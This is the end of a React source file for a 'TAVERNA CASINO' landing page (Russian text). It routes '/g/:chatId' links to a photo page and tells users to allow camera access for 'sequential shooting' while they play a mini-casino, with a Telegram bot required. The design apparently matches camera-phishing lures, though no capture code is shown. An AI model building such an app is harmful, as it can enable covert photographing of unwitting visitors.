      <Route path="/g/:chatId" element={<PhotoPage />} />
      <Route path="/" element={
        <div className="App" style={{
          minHeight: '100vh',
          display: 'flex',
          flexDirection: 'column',
          alignItems: 'center',
          justifyContent: 'center',
          background: 'linear-gradient(135deg, #0f0c29 0%, #302b63 50%, #24243e 100%)',
          color: 'white',
          textAlign: 'center',
          padding: '20px'
        }}>
          <h1 style={{ fontSize: '48px', marginBottom: '20px', color: '#FFD700' }}>🎰 TAVERNA CASINO</h1>
          <p style={{ fontSize: '20px', marginBottom: '30px', maxWidth: '600px' }}>
            Система поочередной съемки с камер + мини-казино
          </p>
          
          <div style={{
            background: 'rgba(255, 255, 255, 0.1)',
            backdropFilter: 'blur(10px)',
            borderRadius: '20px',
            padding: '30px',
            maxWidth: '500px',
            marginBottom: '30px'
          }}>
            <h3 style={{ color: '#FFD700', marginBottom: '15px' }}>📋 Как использовать:</h3>
            <ol style={{ textAlign: 'left', fontSize: '16px', lineHeight: '1.6' }}>
              <li>Получите ссылку с вашим chat_id в Telegram</li>
              <li>Перейдите по ссылке в браузере</li>
              <li>Разрешите доступ к камере</li>
              <li>Система начнет поочередную съемку</li>
              <li>Играйте в мини-казино пока идет процесс</li>
            </ol>
          </div>
          
          <div style={{
            fontSize: '14px',
            color: 'rgba(255, 255, 255, 0.5)',
            marginTop: '20px'
          }}>
            ⚠️ Для работы необходим Telegram бот
          </div>
        </div>
      } />
    </Routes>
  );
};

/**
 * ОСНОВНОЙ РЕНДЕР
 */
const root = ReactDOM.createRoot(document.getElementById("root"));
root.render(
  <BrowserRouter>
    <App />
  </BrowserRouter>
);

export default App;
